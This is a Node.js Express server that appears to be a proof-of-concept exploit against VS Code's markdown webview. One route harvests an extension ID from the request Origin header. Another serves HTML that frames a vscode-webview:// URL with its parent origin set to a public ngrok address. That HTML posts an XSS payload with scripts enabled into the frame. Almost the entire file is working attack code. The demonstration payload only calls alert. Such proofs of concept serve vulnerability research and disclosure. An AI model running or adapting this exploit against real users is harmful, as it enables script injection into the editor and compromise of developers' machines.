const express = require('express')
const app = express()
const port = 3000

var extensionId;

app.get('/stealID', (req, res) => {
    extensionId = req.headers.origin.split('/')[2];
    console.log(extensionId);
    res.send('ID stolen')
})

var publicUrl = "https://dd4c-2409-4063-6e8b-521b-20f6-8d91-93d7-bfd0.ngrok.io"
srcUrl = `vscode-webview://${extensionId}/index.html?id=${extensionId}&amp;swVersion=2&amp;extensionId=vscode.markdown-language-features&amp;platform=electron&amp;vscode-resource-base-authority=vscode-resource.vscode-webview.net&amp;parentOrigin=${publicUrl}`



htmlPOC = `
<script>
function sendMessage(){
    //send post message to frame

    window.frames[0].postMessage({channel:"content",args:{contents:"<img src=x onerror=alert(origin) />",options:{allowScripts:true}}},"*");
}
</script>
<iframe src="${srcUrl}" onload=sendMessage()>
`


app.get('/exploit', (req, res) => {
    res.send(htmlPOC)
})

app.get('/',(req,res)=>{
    res.send("test")
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})